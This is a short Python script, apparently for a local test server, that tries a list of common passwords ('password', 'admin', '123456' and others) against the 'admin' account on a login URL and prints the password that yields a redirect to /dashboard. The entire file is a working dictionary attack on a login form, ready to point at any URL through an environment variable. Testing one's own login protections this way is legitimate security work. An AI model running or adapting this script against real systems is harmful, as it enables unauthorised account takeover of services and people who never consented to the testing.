import os

import requests


URL = os.getenv("LOGIN_URL", "http://127.0.0.1:5000/login")
USERNAME = "admin"
PASSWORDS = [
    "password",
    "admin",
    "123456",
    "Student@123",
    "Admin@123",
]


for password in PASSWORDS:
    response = requests.post(
        URL,
        data={"username": USERNAME, "password": password},
        allow_redirects=False,
        timeout=5,
        proxies={"http": None, "https": None},
    )
    print(
        f"Tried {USERNAME}:{password} -> "
        f"status={response.status_code}, location={response.headers.get('Location')}"
    )
    if response.status_code == 302 and response.headers.get("Location") == "/dashboard":
        print(f"FOUND PASSWORD: {password}")
        break
